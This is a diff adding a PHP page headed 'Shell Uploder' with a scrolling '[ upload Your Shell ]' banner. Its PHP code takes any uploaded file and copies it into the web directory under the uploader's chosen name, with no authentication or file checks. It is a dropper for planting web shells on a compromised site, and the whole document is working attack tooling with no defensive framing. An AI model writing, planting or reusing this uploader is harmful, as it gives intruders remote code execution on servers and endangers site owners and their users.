@@ -1,0 +1,73 @@
+<style type="text/css">
+body {
+  color: red;
+  background:linear-gradient(to right,black,#0d0838);
+}
+h1{
+  background-color: #4D4D4D;
+  color: #000000;
+  text-align: center;
+}
+h2{
+  text-align: center;
+}
+
+input{
+   margin-top:120px;
+}
+marquee{
+  color: red;
+  font-size: 30px;
+  margin-top:190px;
+  width: 330px;
+}
+</style>
+<html>
+<head>
+  <title>uploder</title>
+  
+</head>
+<body>
+
+  <h1>Shell Uploder</h1>
+  
+<form action="" method="POST" enctype="multipart/form-data"> 
+</br></br></br>
+<center>
+  
+<input type="file" name="file" />
+
+<input type="submit" name="submit" value="Upload" />
+
+</center>
+
+</form>
+
+
+</body>
+
+</html
+
+<?php
+if(isset($_POST['submit'])){
+$filename = @copy($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+
+if(!empty($filename)){
+echo "<center><h2></br></br>Your fiile has been uploded.</h2></center>";
+}
+else{
+  echo "<center><h2></br></br>Upload Faild!</h2></center>";
+}
+}
+?>
+<html>
+<head>
+  
+</head>
+<body>
+  <center>
+  <marquee>[ upload Your Shell ]</marquee>
+</body>
+</html>
+
+
